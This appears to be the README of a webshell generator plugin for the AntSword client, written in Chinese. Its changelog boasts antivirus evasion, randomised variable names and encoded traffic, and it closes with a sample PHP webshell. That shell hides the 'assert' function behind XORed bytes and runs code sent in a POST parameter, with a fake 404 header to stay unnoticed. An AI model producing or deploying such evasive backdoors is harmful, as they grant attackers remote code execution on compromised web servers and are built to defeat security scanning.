# as_webshell_venom
webshell-venom 蚁剑版 (thx @SardineFish & @Medicean)


原项目地址:

https://github.com/yzddmr6/webshell-venom

## 关于 webshell-venom 的一个重要通知

https://yzddmr6.tk/2019/08/13/webshell-venom-notice/

# 3.2 更新日志

鸽了这么久，我来更新啦

1. 更新免杀

2. 修复已知问题:宝塔在遇到header404时会解析到他的404模版上，而不是shell上，导致无法连接，故去除头部的404，如有需要自行添加

3. 变量全员随机化，不再有固定的变量名称

4. 增加流量传输编码方式并且兼容原版，具体看这里：
https://github.com/yzddmr6/webshell-venom/tree/master/php

#  2.0 更新日志

1. 代码重构

2. 增加 asp aspx 免杀类型

### 生成 php Shell 样例

```
<?php 
header('HTTP/1.1 404');
class COMI { 
    public $c='';
    function __destruct() {
        $_0 = "\xfc" ^ "\x9d";
        $_1 = "\x4" ^ "\x77";
        $_2 = "\xb4" ^ "\xc7";
        $_3 = "\x9b" ^ "\xfe";
        $_4 = "\x93" ^ "\xe1";
        $_5 = "\xe7" ^ "\x93";
        $db =$_0.$_1.$_2.$_3.$_4.$_5;
        return @$db($this->c);
    }
}
$comi = new COMI();
@$comi->c = $_POST['yzddmr6'];
?>
```
